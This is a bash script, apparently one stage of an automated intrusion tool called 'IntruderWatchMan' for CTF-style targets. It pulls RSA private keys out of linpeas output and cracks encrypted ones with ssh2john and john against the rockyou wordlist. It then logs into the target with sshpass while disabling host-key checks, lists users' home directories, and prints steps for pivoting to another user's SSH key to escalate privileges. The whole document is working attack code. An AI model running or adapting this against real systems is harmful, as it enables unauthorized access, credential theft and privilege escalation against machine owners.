#!/bin/bash
path=$(cat path)
cd $path
IP_address=$(cat IP_address)
working_directory=$(pwd)
port=$(cat port)
#Processing linpeas
nb=2
stop=0
#Looking for ssh key
connect=$(cat ssh_users)
IFS=$'\n' read -rd '' -a user_connect <<< $connect
for usr in ${user_connect[@]}
do
	while [[ $stop != 1 ]]
	do
		end_key=$(grep -E -A $nb ^-{5}BEGIN linpeas_$usr | tail -1)
		if [ "$end_key" = "-----END RSA PRIVATE KEY-----" ]
		then
			grep -E -A $nb ^-{5}BEGIN linpeas_$usr > ssh_key_$usr
			stop=1
			cat ssh_key_$usr
		fi
		nb=$(echo $(($nb+1)))
	done
	#Is encrypted?
	encrypted=$(grep -ic "encrypted" ssh_key_$usr)
	if [ $encrypted -gt 0 ]
	then
		echo -e "\n The key is encrypted"
		cd ..
		cd ..
		cd Tools
		python3 ssh2john.py $working_directory/ssh_key_$usr > ssh_decrypted_key_$usr
		mv ssh_decrypted_key_$usr $working_directory
		cd $working_directory
		john --wordlist=/usr/share/wordlists/rockyou.txt "ssh_decrypted_key_$usr"
		john --show ssh_decrypted_key_$usr | grep : | cut -d ":" -f2 > passphrase_$usr
		echo -e "\n The passphrase for encrypted ssh key is : $(cat passphrase_$usr)"
	fi
	passwd=$(cat password_$usr)
	sshpass -p $passwd ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null $usr@$IP_address "cd /home; ls" > all_users
	potential_target=$(cat all_users)
	for target in $potential_target
	do
		if [ $usr != $target ]
		then
			echo $target >> target_usr
			#End with ssh_key
			escalation_with_ssh_key=$(cat target_usr | wc -l)
			if [ $escalation_with_ssh_key -gt 0 ]
			then
				target_usr=$(cat target_usr)
				passphrase=$(cat passphrase_$usr)
				echo -e "\n End of IntruderWatchMan"
				echo -e "\n To be root you need to do the following:"
				echo -e "\n ssh $usr@$IP_address password : $passwd"
				echo -e "\n cd /home/$target_usr/.ssh"
				echo -e "\n ssh -i id_rsa $target_usr@$IP_address password : $passphrase"
			fi
		fi
	done
done
